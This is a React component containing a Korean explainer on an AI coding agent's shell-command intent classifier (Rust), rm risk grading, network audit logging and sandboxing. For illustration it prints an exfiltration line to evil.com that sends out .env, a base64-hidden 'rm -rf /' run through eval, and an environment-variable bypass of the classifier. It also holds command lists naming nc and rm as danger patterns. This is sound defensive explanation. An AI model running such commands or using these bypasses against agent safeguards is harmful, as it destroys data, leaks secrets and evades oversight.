import IntentCategoriesViz from './viz/IntentCategoriesViz';
import DestructiveLevelViz from './viz/DestructiveLevelViz';

export default function CommandIntentSection() {
  return (
    <section id="command-intent" className="mb-16 scroll-mt-20">
      <h2 className="text-2xl font-bold mb-6">CommandIntent 분류 &amp; 파괴적 명령어 탐지</h2>
      <div className="prose prose-neutral dark:prose-invert max-w-none">

        <IntentCategoriesViz />

        <h3 className="text-xl font-semibold mt-6 mb-3">CommandIntent enum 8종</h3>
        <p>
          <strong>8개 카테고리 설계</strong> (상단 Viz 참조): 파일 시스템, 네트워크, 실행, 패키지, 시스템 5축 × 읽기/쓰기/파괴 3축<br />
          Execute와 Package 분리 이유: 패키지 관리자는 네트워크+쓰기+실행 모두 하는 <strong>복합 연산</strong>
        </p>

        <h3 className="text-xl font-semibold mt-8 mb-3">classify() 구현</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`impl CommandIntent {
    pub fn classify(cmd: &str) -> Self {
        let trimmed = cmd.trim();

        // 파이프/리다이렉션 무시, 첫 명령어만 추출
        let first_word = trimmed
            .split(|c: char| c.is_whitespace() || c == '|' || c == ';' || c == '&')
            .next()
            .unwrap_or("");

        // 절대 경로라면 basename만
        let basename = std::path::Path::new(first_word)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(first_word);

        match basename {
            "ls" | "cat" | "head" | "tail" | "less" | "more" |
            "grep" | "find" | "locate" | "wc" | "file" => Self::Read,

            "mv" | "cp" | "mkdir" | "touch" | "ln" | "chmod" | "chown" => Self::Write,

            "rm" | "shred" | "dd" | "mkfs" | "wipefs" | "srm" | "fdisk" => Self::Destructive,

            "curl" | "wget" | "ssh" | "scp" | "rsync" |
            "nc" | "netcat" | "ping" | "telnet" | "ftp" => Self::Network,

            "python" | "python3" | "node" | "ruby" | "perl" |
            "sh" | "bash" | "zsh" | "fish" => Self::Execute,

            "apt" | "apt-get" | "yum" | "dnf" | "brew" |
            "pip" | "pip3" | "npm" | "yarn" | "cargo" | "go" => Self::Package,

            "sudo" | "su" | "systemctl" | "service" |
            "reboot" | "shutdown" | "mount" | "umount" | "kill" => Self::System,

            _ => Self::Unknown,
        }
    }
}`}</pre>
        <p>
          <strong>첫 단어 + basename 매칭</strong>: <code>/usr/bin/rm</code>도 <code>rm</code>으로 정규화<br />
          파이프·세미콜론·앰퍼샌드를 구분자로 취급 — 가장 위험한 첫 명령 기준<br />
          약 50개 명령어를 8개 카테고리로 매핑 — 나머지는 Unknown
        </p>

        <h3 className="text-xl font-semibold mt-8 mb-3">Destructive 명령 세부 검증</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// rm 명령의 위험도 세분화
pub fn analyze_rm(cmd: &str) -> DestructiveLevel {
    if cmd.contains("-rf") || cmd.contains("-fr") || cmd.contains("--recursive --force") {
        if cmd.contains("/") || cmd.contains("*") {
            return DestructiveLevel::Critical;  // 디렉토리 + recursive
        }
        return DestructiveLevel::High;
    }
    if cmd.contains("-r") || cmd.contains("-R") {
        return DestructiveLevel::Medium;
    }
    DestructiveLevel::Low  // 단일 파일
}

pub enum DestructiveLevel { Low, Medium, High, Critical }`}</pre>
        <DestructiveLevelViz />

        <h3 className="text-xl font-semibold mt-8 mb-3">네트워크 명령 로깅</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// Network 분류 시 네트워크 로그 활성화
pub fn execute_network_cmd(&self, cmd: &str) -> Result<ToolOutput> {
    let url_regex = Regex::new(r"https?://[^\\s]+").unwrap();
    let urls: Vec<String> = url_regex.find_iter(cmd)
        .map(|m| m.as_str().to_string())
        .collect();

    // 감사 로그에 기록
    self.audit_log.record_network(AuditNetwork {
        command: cmd.into(),
        urls,
        timestamp: Utc::now(),
    });

    // 실행
    self.run_command(cmd)
}`}</pre>
        <p>
          <strong>URL 추출 + 감사 로그</strong>: 어떤 외부 주소와 통신했는지 기록<br />
          보안팀이 로그 분석으로 <strong>데이터 유출 탐지</strong> 가능<br />
          <code>curl http://evil.com/steal?data=$(cat .env)</code> 같은 공격 시도 포착
        </p>

        <h3 className="text-xl font-semibold mt-8 mb-3">패턴 매칭의 한계 — 오탐/미탐</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// 오탐 예시 (실제는 안전한데 Destructive로 분류됨)
bash("echo 'rm -rf /backup' >> README.md")
  → 첫 단어: echo → Read 분류 → 정상 실행 ✓

// 미탐 예시 (위험한데 Destructive로 미분류)
bash("eval \\"$(echo cm0gLXJmIC8= | base64 -d)\\"")
  → 첫 단어: eval → Execute 분류 (Prompt만) → 숨겨진 rm -rf / 실행!

// 환경 변수 우회
bash("$DANGEROUS_CMD")
  → 첫 단어: $DANGEROUS_CMD → Unknown → 검증 우회`}</pre>
        <p>
          <strong>근본 한계</strong>: 문자열 패턴만으로는 완벽한 분류 불가<br />
          공격자는 base64, eval, 환경 변수 등으로 우회 가능<br />
          <strong>claw-code의 대응</strong>: 샌드박스(bubblewrap)로 실행 자체를 격리 — 우회 성공해도 피해 제한
        </p>

        <h3 className="text-xl font-semibold mt-8 mb-3">분류 정확도 측정</h3>
        <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm">{`// tests/intent_classify.rs
#[test]
fn classification_accuracy() {
    let cases = vec![
        ("ls -la", CommandIntent::Read),
        ("cat file.txt", CommandIntent::Read),
        ("rm -rf old/", CommandIntent::Destructive),
        ("curl https://example.com", CommandIntent::Network),
        ("sudo apt install", CommandIntent::System),
        // ... 200개 테스트 케이스
    ];

    let mut correct = 0;
    for (cmd, expected) in &cases {
        if CommandIntent::classify(cmd) == *expected {
            correct += 1;
        }
    }
    let accuracy = correct as f32 / cases.len() as f32;
    assert!(accuracy > 0.95, "accuracy {:.2}% too low", accuracy * 100.0);
}`}</pre>
        <p>
          <strong>정확도 목표</strong>: 95% 이상 — 200개 테스트 케이스로 회귀 방지<br />
          5% 오분류는 허용 — 대부분 Unknown으로 떨어져 보수적 처리<br />
          새 명령어 추가 시 테스트 케이스도 함께 추가 — 정확도 유지
        </p>

        <div className="bg-amber-50 dark:bg-amber-950/30 border-l-4 border-amber-400 p-4 my-6 rounded-r-lg">
          <p className="font-semibold mb-2">인사이트: 정적 분석 vs 런타임 샌드박스</p>
          <p>
            <strong>정적 분석(CommandIntent)</strong>:<br />
            - 장점: 빠름, 로그 가능, LLM에게 에러 피드백 가능<br />
            - 단점: 우회 가능 (eval, base64, 환경 변수)
          </p>
          <p className="mt-2">
            <strong>런타임 샌드박스(bubblewrap)</strong>:<br />
            - 장점: 우회 불가 — kernel 레벨 격리<br />
            - 단점: 느림 (컨테이너 시작 오버헤드), Linux 전용
          </p>
          <p className="mt-2">
            claw-code는 <strong>두 층 모두 사용</strong> — 정적 분석으로 90% 케이스 커버, 샌드박스로 나머지 10% 방어<br />
            정적 분석 실패해도 샌드박스가 있고, 샌드박스 불가 환경(macOS 등)에서도 정적 분석이 작동<br />
            "Defense in depth" — 한 층이 뚫려도 다른 층이 방어
          </p>
        </div>

      </div>
    </section>
  );
}
